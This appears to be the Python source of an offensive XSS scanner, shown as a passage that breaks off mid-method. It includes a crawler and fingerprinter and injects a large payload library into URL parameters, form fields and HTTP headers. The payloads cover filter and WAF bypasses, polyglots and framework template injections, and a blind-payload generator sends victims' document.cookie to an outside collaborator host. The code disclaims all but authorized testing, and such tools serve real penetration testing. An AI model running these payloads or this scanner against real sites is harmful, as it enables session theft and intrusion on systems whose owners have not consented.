#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║              XSS-SCANNER - Advanced XSS Vulnerability Tool        ║
║         For Authorized Penetration Testing & Bug Bounty Only      ║
╚═══════════════════════════════════════════════════════════════════╝

Author  : Security Research Tool
Purpose : Authorized XSS vulnerability assessment
Warning : Use only on systems you have explicit permission to test
"""

import sys
import os
import re
import json
import time
import html
import urllib.parse
import hashlib
import random
import string
import argparse
import threading
from datetime import datetime
from collections import defaultdict
from typing import Optional

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from bs4 import BeautifulSoup
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
except ImportError as e:
    print(f"[ERROR] Missing dependency: {e}")
    print("Run: pip install requests beautifulsoup4 colorama")
    sys.exit(1)

requests.packages.urllib3.disable_warnings()

# ─────────────────────────────────────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────────────────────────────────────

BANNER = f"""
{Fore.RED}██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
{Fore.RED}╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
{Fore.YELLOW} ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
{Fore.YELLOW} ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
{Fore.RED}██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
{Fore.RED}╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.CYAN}  ┌─────────────────────────────────────────────────────────────────┐
{Fore.CYAN}  │  {Fore.WHITE}Advanced XSS Vulnerability Scanner  {Fore.YELLOW}v2.0{Fore.CYAN}                      │
{Fore.CYAN}  │  {Fore.GREEN}For Authorized Penetration Testing & Bug Bounty Only{Fore.CYAN}          │
{Fore.CYAN}  │  {Fore.RED}⚠  Unauthorized use is illegal and unethical  ⚠{Fore.CYAN}              │
{Fore.CYAN}  └─────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""

# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOAD DATABASE  (PortSwigger Cheat Sheet + Extended)
# ─────────────────────────────────────────────────────────────────────────────

class PayloadDatabase:
    """Comprehensive XSS payload library based on PortSwigger cheat sheet + extensions."""

    # ── Basic / Classic ──────────────────────────────────────────────────────
    BASIC = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script >alert(1)</script >",
        "<script\t>alert(1)</script>",
        "<script\n>alert(1)</script>",
    ]

    # ── Event Handlers (PortSwigger Cheat Sheet) ──────────────────────────────
    EVENT_HANDLERS = [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=1 onerror=alert(1)>",
        "<img/src=x onerror=alert(1)>",
        "<img src=x oNErRoR=alert(1)>",
        "<body onload=alert(1)>",
        "<body/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "<input autofocus onfocus=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<video onerror=alert(1)><source>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<details/open/ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<iframe onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<a href='javascript:alert(1)'>click</a>",
        '<a href="javascript:alert(1)">click</a>',
        "<div onmouseover=alert(1)>hover</div>",
        "<div onclick=alert(1)>click</div>",
        "<button onclick=alert(1)>click</button>",
        "<form><button formaction=javascript:alert(1)>click",
        "<math><a xlink:href=javascript:alert(1)>click</a></math>",
        "<table background=javascript:alert(1)>",
        "<td background=javascript:alert(1)>",
        "<link rel=stylesheet href=javascript:alert(1)>",
        "<body onpageshow=alert(1)>",
        "<body onfocus=alert(1)>",
        "<body onhashchange=alert(1)><a href=#x>click",
        "<body onresize=alert(1)>",
        "<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br>",
        "<script>window.onload=function(){alert(1)}</script>",
        "<style>*{background:url(javascript:alert(1))}</style>",
        "<style>body{background-image:url(javascript:alert(1))}</style>",
        "<object/data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<base href=javascript:alert(1)//>",
        "<!DOCTYPE html><html><head><base href=javascript:alert(1)//></head><body><a href=/x>click</a></body></html>",
    ]

    # ── Attribute Breakout ────────────────────────────────────────────────────
    ATTR_BREAKOUT = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onclick="alert(1)',
        "' onclick='alert(1)",
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '" onerror="alert(1)" src="x',
        "' onerror='alert(1)' src='x",
        '"/><script>alert(1)</script>',
        "'/><script>alert(1)</script>",
        "\"autofocus/onfocus=alert(1)//",
        "'autofocus/onfocus=alert(1)//",
        '`onmouseover=alert(1)`',
        '"><svg/onload=alert(1)>',
        "' onpointerover='alert(1)",
        '" onpointerover="alert(1)',
    ]

    # ── JavaScript URI ────────────────────────────────────────────────────────
    JAVASCRIPT_URI = [
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        "javascript:alert(document.domain)",
        "JaVaScRiPt:alert(1)",
        "JAVASCRIPT:alert(1)",
        "javascript&#58;alert(1)",
        "javascript&#x3A;alert(1)",
        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        "java\rscript:alert(1)",
        "java&#9;script:alert(1)",
        "java&#10;script:alert(1)",
        "java&#13;script:alert(1)",
        "  javascript:alert(1)",
        "\u0001javascript:alert(1)",
        "javascript\x00:alert(1)",
        "vbscript:msgbox(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]

    # ── SVG Vectors ───────────────────────────────────────────────────────────
    SVG_VECTORS = [
        "<svg><script>alert(1)</script></svg>",
        "<svg><script>alert&#40;1&#41;</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributeName=x onbegin=alert(1) dur=1s>",
        "<svg><use href='data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzUwMCcgaGVpZ2h0PSc1MDAnPgo8aW1hZ2UgeG1sbnM6eGxpbms9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsnIG9uZXJyb3I9J2FsZXJ0KDEpJyBobGluaz0nLycgLz4KPC9zdmc+'></use></svg>",
        "<svg onload=alert(1)>",
        "<svg><a><animate attributeName=href values=javascript:alert(1) /><text y=15>Click</text></a></svg>",
        "<svg><discard onbegin=alert(1)>",
        "<svg><image href=1 onerror=alert(1)>",
        "<math><a xlink:href=javascript:alert(1)>XSS</a></math>",
        "<math><annotation-xml encoding=application/xhtml+xml><script xmlns=http://www.w3.org/1999/xhtml>alert(1)</script></annotation-xml></math>",
    ]

    # ── HTML5 Vectors ─────────────────────────────────────────────────────────
    HTML5 = [
        "<video><source onerror=\"alert(1)\">",
        "<audio><source onerror=\"alert(1)\">",
        "<video src=1 onerror=alert(1)>",
        "<audio src=1 onerror=alert(1)>",
        "<picture><source srcset=1 onerror=alert(1)>",
        "<details open ontoggle=alert(1)>XSS</details>",
        "<canvas onmousedown=alert(1)>click",
        "<template id=x><img src=1 onerror=alert(1)></template><script>document.body.appendChild(document.getElementById('x').content)</script>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
        "<form><input type=submit formaction=javascript:alert(1) value=click>",
        "<input type=image src=1 onerror=alert(1)>",
        "<isindex action=javascript:alert(1) type=image>",
        "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
    ]

    # ── Filter Bypass ─────────────────────────────────────────────────────────
    FILTER_BYPASS = [
        # Double encoding
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        # HTML entity encoding
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        # Null bytes
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<scr\u0000ipt>alert(1)</scr\u0000ipt>",
        # Comment injection
        "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
        "<!--<script>-->alert(1)<!--</script>-->",
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<sCrIpT>alert(1)</sCrIpT>",
        # Space substitution
        "<img\tsrc=x\tonerror=alert(1)>",
        "<img\rsrc=x\ronerror=alert(1)>",
        "<img\nsrc=x\nonerror=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        # String concatenation
        "<script>al\u0065rt(1)</script>",
        "<script>eval('ale'+'rt(1)')</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>setTimeout('alert(1)',0)</script>",
        "<script>setInterval('alert(1)',0)</script>",
        "<script>Function('alert(1)')()</script>",
        # Expression
        "<script>window['alert'](1)</script>",
        "<script>this['alert'](1)</script>",
        "<script>top['alert'](1)</script>",
        "<script>self['alert'](1)</script>",
        # Fromcharcode
        "<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        # Unicode
        "<script>\u0061\u006C\u0065\u0072\u0074(1)</script>",
        # Hex encoding
        "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
        # WAF bypass
        "<script>alert`1`</script>",
        "<script>alert(1//comment\n)</script>",
        "<img src=x onerror=alert(1) x>",
        "<svg><script>alert(1)//</script></svg>",
        # Longest chain
        "<body onXXX=alert(1) style=animation-name:x onanimationstart=alert(1)>",
        "<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>",
    ]

    # ── DOM-Based XSS ─────────────────────────────────────────────────────────
    DOM_BASED = [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "#javascript:alert(1)",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "';alert(1)//",
        "\";alert(1)//",
        "';alert(1)//",
        "1;alert(1)",
        "1'alert(1)",
        "</script><script>alert(1)</script>",
        "\\';alert(1)//",
        "\\\"alert(1)//",
        # location.hash
        "%23<script>alert(1)</script>",
        "%23<img src=x onerror=alert(1)>",
        # postMessage
        "<script>window.opener.postMessage('<img src=x onerror=alert(1)>','*')</script>",
        # innerHTML
        "<img src=x onerror=alert(document.domain)>",
        # eval injection
        "1;alert(document.cookie);1",
        "0;alert(document.domain)",
    ]

    # ── Angular / React / Vue / Template ──────────────────────────────────────
    FRAMEWORK = {
        "angular": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{7*'7'}}",
            "[[constructor.constructor('alert(1)')()]]",
            "<div ng-app>{{7*7}}</div>",
            "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "<script>angular.module('x',[]).run(function($rootScope){$rootScope.$eval('constructor.constructor(\"alert(1)\")()')})</script>",
            "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
        ],
        "react": [
            "dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}",
            "<div dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}></div>",
            "javascript:alert(1)",
            "<a href={`javascript:alert(1)`}>click</a>",
        ],
        "vue": [
            "{{constructor.constructor('alert(1)')()}}",
            "v-html=\"'<img src=x onerror=alert(1)>'\"",
            "<div v-html=\"xss\">",
            "{{$parent.$el.ownerDocument.defaultView.alert(1)}}",
        ],
        "wordpress": [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<img src=x onerror=alert(1)>",
            "/?s=<script>alert(1)</script>",
            "/wp-comments-post.php",
        ],
        "php": [
            "<script>alert(1)</script>",
            "<?php echo '<script>alert(1)</script>'; ?>",
            '"><script>alert(1)</script>',
        ],
        "asp": [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<img src=x onerror=alert(1)>",
        ],
        "jsp": [
            "<script>alert(1)</script>",
            "${\"<script>alert(1)</script>\"}",
            "<%= \"<script>alert(1)</script>\" %>",
        ],
    }

    # ── Polyglot Payloads ─────────────────────────────────────────────────────
    POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
        "'>\"<img/onerror=alert(1) src=>",
        "'\"><img src=/ onerror=alert(document.domain)>",
        "\">'><img src=x id=x onerror=alert(1)>",
        "\"><img src=x onerror=alert(document.cookie)>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "<script>alert('XSS')//",
        "*/alert(1)//",
        "<!--<script>alert(1)//-->",
        "<![CDATA[></p><script>alert(1)</script><!]]>",
        "<!--<img src=x onerror=alert(1)>-->",
        "<svg/onload=&{[alert]}()>",
    ]

    # ── Blind / Out-of-Band ───────────────────────────────────────────────────
    @staticmethod
    def blind_payloads(collaborator_url: str) -> list:
        return [
            f"<script>fetch('{collaborator_url}?c='+document.cookie)</script>",
            f"<script>new Image().src='{collaborator_url}?c='+document.cookie</script>",
            f"<img src=x onerror=\"fetch('{collaborator_url}?d='+document.domain)\">",
            f"<script>document.write('<img src=\"{collaborator_url}?c='+document.cookie+'\">')</script>",
            f"<script>navigator.sendBeacon('{collaborator_url}',document.cookie)</script>",
            f"<script>var x=new XMLHttpRequest();x.open('GET','{collaborator_url}?c='+btoa(document.cookie));x.send()</script>",
            f"\"><script>fetch('{collaborator_url}/xss?c='+btoa(document.cookie))</script>",
            f"'><img src=x onerror=fetch('{collaborator_url}/xss?d='+document.domain)>",
        ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Return all non-framework, non-blind payloads deduplicated."""
        all_p = []
        for attr in [cls.BASIC, cls.EVENT_HANDLERS, cls.ATTR_BREAKOUT,
                     cls.JAVASCRIPT_URI, cls.SVG_VECTORS, cls.HTML5,
                     cls.FILTER_BYPASS, cls.DOM_BASED, cls.POLYGLOT]:
            all_p.extend(attr)
        return list(dict.fromkeys(all_p))  # deduplicate preserving order

    @classmethod
    def get_framework_payloads(cls, tech_stack: list) -> list:
        """Return payloads specific to detected technologies."""
        payloads = []
        for tech in tech_stack:
            tech_lower = tech.lower()
            for key, plist in cls.FRAMEWORK.items():
                if key in tech_lower:
                    payloads.extend(plist)
        return list(dict.fromkeys(payloads))


# ─────────────────────────────────────────────────────────────────────────────
#  TECHNOLOGY FINGERPRINTER
# ─────────────────────────────────────────────────────────────────────────────

class TechFingerprinter:
    """Detects web technologies from headers, cookies, and HTML content."""

    SIGNATURES = {
        "WordPress":    [r"wp-content", r"wp-includes", r"WordPress"],
        "Drupal":       [r"Drupal", r"drupal\.js", r"/sites/default/files/"],
        "Joomla":       [r"Joomla!", r"/components/com_", r"joomla"],
        "Angular":      [r"ng-version", r"angular\.js", r"ng-app", r"\bangular\b"],
        "React":        [r"react\.js", r"react-dom", r"__REACT_", r"data-reactroot"],
        "Vue":          [r"vue\.js", r"__vue__", r"v-bind", r"v-model"],
        "jQuery":       [r"jquery[\.\-][\d]", r"jQuery\.fn\.jquery"],
        "Bootstrap":    [r"bootstrap\.css", r"bootstrap\.js"],
        "PHP":          [r"\.php", r"X-Powered-By: PHP", r"PHPSESSID"],
        "ASP.NET":      [r"\.aspx", r"ASP\.NET", r"__VIEWSTATE", r"X-AspNet-Version"],
        "Java/JSP":     [r"\.jsp", r"JSESSIONID", r"javax\.faces"],
        "Django":       [r"csrfmiddlewaretoken", r"django", r"CSRF"],
        "Laravel":      [r"laravel_session", r"XSRF-TOKEN", r"Laravel"],
        "Rails":        [r"_rails", r"X-Runtime", r"_session_id"],
        "Express":      [r"X-Powered-By: Express", r"connect\.sid"],
        "Flask":        [r"Werkzeug", r"Flask", r"session=\."],
        "Spring":       [r"JSESSIONID", r"X-Application-Context"],
        "Next.js":      [r"__NEXT_DATA__", r"_next/static"],
        "Nuxt.js":      [r"__nuxt", r"_nuxt/"],
        "Nginx":        [r"Server: nginx"],
        "Apache":       [r"Server: Apache"],
        "IIS":          [r"Server: Microsoft-IIS", r"X-Powered-By: ASP\.NET"],
        "CloudFlare":   [r"cf-ray", r"cloudflare"],
        "Shopify":      [r"shopify", r"Shopify\.theme"],
        "Magento":      [r"Magento", r"MAGE_"],
        "WooCommerce":  [r"woocommerce", r"wc-"],
    }

    @classmethod
    def detect(cls, response: requests.Response) -> list:
        detected = []
        # Combine headers, cookies, and body for analysis
        headers_str = str(dict(response.headers)).lower()
        cookies_str = str(dict(response.cookies))
        body_str    = response.text[:50000]  # first 50KB

        combined = headers_str + cookies_str + body_str

        for tech, patterns in cls.SIGNATURES.items():
            for pat in patterns:
                if re.search(pat, combined, re.IGNORECASE):
                    detected.append(tech)
                    break

        return list(set(detected))


# ─────────────────────────────────────────────────────────────────────────────
#  HTTP CLIENT
# ─────────────────────────────────────────────────────────────────────────────

class HTTPClient:
    """Manages HTTP sessions with retry, proxy, and header configuration."""

    DEFAULT_HEADERS = {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "keep-alive",
    }

    def __init__(self, proxy: str = None, timeout: int = 15, delay: float = 0.5):
        self.session = requests.Session()
        self.timeout = timeout
        self.delay   = delay
        self.request_count  = 0
        self.response_count = 0

        # Retry adapter
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # Proxy
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        self.session.headers.update(self.DEFAULT_HEADERS)
        self.session.verify = False

    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        try:
            time.sleep(self.delay)
            self.request_count += 1
            r = self.session.get(url, timeout=self.timeout, allow_redirects=True, **kwargs)
            self.response_count += 1
            return r
        except Exception as e:
            return None

    def post(self, url: str, data: dict = None, **kwargs) -> Optional[requests.Response]:
        try:
            time.sleep(self.delay)
            self.request_count += 1
            r = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True, **kwargs)
            self.response_count += 1
            return r
        except Exception as e:
            return None

    def add_header(self, key: str, value: str):
        self.session.headers[key] = value

    def add_cookie(self, name: str, value: str):
        self.session.cookies.set(name, value)


# ─────────────────────────────────────────────────────────────────────────────
#  CRAWLER
# ─────────────────────────────────────────────────────────────────────────────

class Crawler:
    """Discovers URLs, forms, parameters, and injection points."""

    def __init__(self, client: HTTPClient, base_url: str, max_pages: int = 100):
        self.client    = client
        self.base_url  = base_url
        self.base_host = urllib.parse.urlparse(base_url).netloc
        self.max_pages = max_pages
        self.visited   = set()
        self.to_visit  = [base_url]
        self.forms     = []       # list of FormTarget
        self.url_params= []       # list of (url, param_name, original_value)
        self.headers_injectable = []

    def crawl(self, logger) -> None:
        logger.info(f"Starting crawl from: {self.base_url}")
        pages = 0

        while self.to_visit and pages < self.max_pages:
            url = self.to_visit.pop(0)
            if url in self.visited:
                continue
            self.visited.add(url)
            pages += 1

            logger.progress(f"  [{pages}/{self.max_pages}] Crawling: {url[:80]}")
            resp = self.client.get(url)
            if not resp:
                continue

            self._extract_links(url, resp)
            self._extract_forms(url, resp)
            self._extract_url_params(url)

        logger.info(f"Crawl complete: {len(self.visited)} pages, "
                    f"{len(self.forms)} forms, "
                    f"{len(self.url_params)} URL params")

    def _extract_links(self, base: str, resp: requests.Response):
        soup = BeautifulSoup(resp.text, "html.parser")
        for tag in soup.find_all(["a", "link"], href=True):
            href = tag.get("href", "").strip()
            abs_url = urllib.parse.urljoin(base, href)
            parsed  = urllib.parse.urlparse(abs_url)
            if parsed.netloc == self.base_host and abs_url not in self.visited:
                self.to_visit.append(abs_url)

        # Also pick up form action URLs and script src
        for tag in soup.find_all(["form"]):
            action = tag.get("action", "")
            if action:
                abs_url = urllib.parse.urljoin(base, action)
                if urllib.parse.urlparse(abs_url).netloc == self.base_host:
                    if abs_url not in self.visited:
                        self.to_visit.append(abs_url)

    def _extract_forms(self, page_url: str, resp: requests.Response):
        soup = BeautifulSoup(resp.text, "html.parser")
        for form in soup.find_all("form"):
            action  = form.get("action", page_url)
            method  = form.get("method", "GET").upper()
            abs_url = urllib.parse.urljoin(page_url, action)

            fields = {}
            for inp in form.find_all(["input", "textarea", "select"]):
                name  = inp.get("name")
                value = inp.get("value", "test")
                itype = inp.get("type", "text").lower()
                if name and itype not in ("submit", "reset", "button", "image", "hidden", "file"):
                    fields[name] = value
                elif name and itype == "hidden":
                    fields[name] = value  # keep hidden fields with original value

            if fields:
                self.forms.append({
                    "page_url": page_url,
                    "action":   abs_url,
                    "method":   method,
                    "fields":   fields,
                })

    def _extract_url_params(self, url: str):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        for name, values in params.items():
            self.url_params.append({
                "url":      url,
                "param":    name,
                "original": values[0] if values else "",
            })


# ─────────────────────────────────────────────────────────────────────────────
#  VULNERABILITY FINDER
# ─────────────────────────────────────────────────────────────────────────────

class VulnerabilityFinder:
    """Core engine: injects payloads and analyzes responses."""

    CONTEXT_PATTERNS = {
        "reflected_raw":   r"XSSTOKEN",          # raw in body
        "in_attribute":    r'(?:value|href|src|action|data)[=\s]*["\']?[^"\']*XSSTOKEN',
        "in_js":           r'(?:var\s+\w+\s*=|=)\s*["\']?[^"\']*XSSTOKEN',
        "in_comment":      r"<!--.*?XSSTOKEN.*?-->",
    }

    def __init__(self, client: HTTPClient, tech_stack: list,
                 collaborator: str = None, verbose: bool = False):
        self.client       = client
        self.tech_stack   = tech_stack
        self.collaborator = collaborator
        self.verbose      = verbose
        self.findings     = []
        self._lock        = threading.Lock()

        # Build payload set
        db = PayloadDatabase
        self.payloads = db.get_all_payloads()
        self.payloads += db.get_framework_payloads(tech_stack)
        if collaborator:
            self.payloads += db.blind_payloads(collaborator)
        # Deduplicate
        self.payloads = list(dict.fromkeys(self.payloads))

    def _make_token(self) -> str:
        """Unique token to confirm reflection."""
        return "XSS" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

    def _check_reflected(self, token: str, response: requests.Response) -> bool:
        if not response:
            return False
        body = response.text
        # Check if the token is reflected (not HTML-entity-encoded beyond recognition)
        return (token.lower() in body.lower() or
                urllib.parse.quote(token).lower() in body.lower())

    def _check_executed(self, payload: str, response: requests.Response) -> tuple:
        """
        Returns (executed: bool, context: str)
        We check if the payload is reflected without encoding that would prevent execution.
        """
        if not response:
            return False, ""
        body = response.text
        p_lower = payload.lower()

        # Look for unencoded script/event patterns
        danger_patterns = [
            r"<script[^>]*>",
            r"onerror\s*=",
            r"onload\s*=",
            r"onfocus\s*=",
            r"onclick\s*=",
            r"onmouseover\s*=",
            r"ontoggle\s*=",
            r"onbegin\s*=",
            r"javascript\s*:",
            r"<svg[^>]*>",
            r"<img[^>]*>",
        ]

        context = "unknown"

        # Check if payload appears unencoded
        stripped = re.sub(r'\s+', ' ', payload.lower())
        body_lower = body.lower()

        if stripped in body_lower:
            # Now check context
            idx = body_lower.find(stripped)
            snippet = body[max(0, idx-100):idx+len(payload)+100]

            if re.search(r'<script', snippet, re.I):
                context = "JavaScript context"
            elif re.search(r'<\w+\s+[^>]*$', snippet[:100], re.I):
                context = "HTML attribute"
            else:
                context = "HTML body"

            # Check for dangerous patterns
            for pat in danger_patterns:
                if re.search(pat, stripped):
                    return True, context

        # Check for partial execution indicators
        xss_keywords = ["alert", "onerror", "onload", "javascript:", "<script", "<svg", "<img"]
        for kw in xss_keywords:
            kw_encoded = html.escape(kw)
            if kw in body_lower and kw_encoded not in body.lower():
                return True, f"Unencoded {kw} detected"

        return False, ""

    def test_url_param(self, target: dict, logger) -> list:
        """Test a URL parameter for XSS."""
        results = []
        url     = target["url"]
        param   = target["param"]
        parsed  = urllib.parse.urlparse(url)

        for payload in self.payloads:
            token = self._make_token()
            tagged_payload = payload.replace("alert(1)", f"alert('{token}')")
            if "alert" not in payload:
                tagged_payload = payload  # keep as-is for non-alert payloads

            # Build modified URL
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [tagged_payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            test_url  = parsed._replace(query=new_query).geturl()

            if self.verbose:
                logger.debug(f"    Testing: {param}={tagged_payload[:60]}...")

            resp = self.client.get(test_url)
            if not resp:
                continue

            executed, context = self._check_executed(payload, resp)
            reflected = self._check_reflected(tagged_payload[:20], resp)

            if executed or reflected:
                finding = {
                    "type":       "Reflected XSS" if reflected else "Potential XSS",
                    "location":   "URL Parameter",
                    "url":        test_url,
                    "param":      param,
                    "payload":    payload,
                    "method":     "GET",
                    "context":    context or "Reflected in response",
                    "request":    self._format_request("GET", test_url, {}),
                    "response_snippet": resp.text[:500],
                    "status_code": resp.status_code,
                    "evidence": f"Payload reflected/executed in response (Status: {resp.status_code})",
                }
                results.append(finding)
                logger.vuln(f"  ✓ VULNERABLE: {param} | {payload[:60]}")
                # Don't break — find multiple vulnerabilities

        return results

    def test_form(self, form: dict, logger) -> list:
        """Test all injectable form fields."""
        results = []
        action  = form["action"]
        method  = form["method"]

        for field_name in form["fields"]:
            # Skip fields that look like CSRF tokens or honeypots
            if re.search(r'csrf|token|honey|captcha', field_name, re.I):
                continue

            for payload in self.payloads:
                token = self._make_token()
                tagged_payload = payload.replace("alert(1)", f"alert('{token}')")

                # Build data dict — keep other fields as original
                data = dict(form["fields"])
                data[field_name] = tagged_payload

                if self.verbose:
                    logger.debug(f"    Form {field_name}: {tagged_payload[:50]}...")

                if method == "POST":
                    resp = self.client.post(action, data=data)
                else:
                    resp = self.client.get(action, params=data)

                if not resp:
                    continue

                executed, context = self._check_executed(payload, resp)
                reflected = self._check_reflected(tagged_payload[:20], resp)

                if executed or reflected:
                    finding = {
                        "type":       "Reflected XSS" if reflected else "Potential XSS",
                        "location":   f"Form Field ({method})",
                        "url":        action,
                        "param":      field_name,
                        "payload":    payload,
                        "method":     method,
                        "context":    context or "Reflected in response",
                        "request":    self._format_request(method, action, data),
                        "response_snippet": resp.text[:500],
                        "status_code": resp.status_code,
                        "evidence":   f"Payload reflected/executed in form response (Status: {resp.status_code})",
                        "form_data":  data,
                    }
                    results.append(finding)
                    logger.vuln(f"  ✓ FORM VULNERABLE: {field_name} @ {action[:60]} | {payload[:50]}")

        return results

    def test_headers(self, url: str, logger) -> list:
        """Test HTTP headers (Referer, User-Agent, X-Forwarded-For) for injection."""
        results = []
        inject_headers = {
            "Referer":         "http://evil.com",
            "User-Agent":      "XSS-Test",
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "evil.com",
            "Host":            urllib.parse.urlparse(url).netloc,
        }

        header_payloads = [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<img src=x onerror=alert(1)>",
        ]

        for header_name in ["Referer", "User-Agent", "X-Forwarded-For"]:
            for payload in header_payloads:
                custom_headers = {header_name: payload}
                resp = self.client.get(url, headers=custom_headers)
                if not resp:
                    continue

                executed, context = self._check_executed(payload, resp)
                if executed:
                    finding = {
                        "type":     "Reflected XSS via HTTP Header",
                        "location": f"HTTP Header: {header_name}",
                        "url":      url,
                        "param":    header_name,
                        "payload":  payload,
                        "method":   "GET",
                        "context":  context,
                        "request":  self._format_request("GET", url, {}, {header_name: payload}),
                        "response_snippet": resp.text[:500],
                        "status_code": resp.status_code,
                        "evidence": f"Header value reflected unencoded in response",
                    }
                    results.append(finding)
                    logger.vuln(f"  ✓ HEADER VULNERABLE: {header_name} | {payload[:50]}")

        return results

    def _format_request(self, method: str, url: str,
                        data: dict = None, headers: dict = None) -> str:
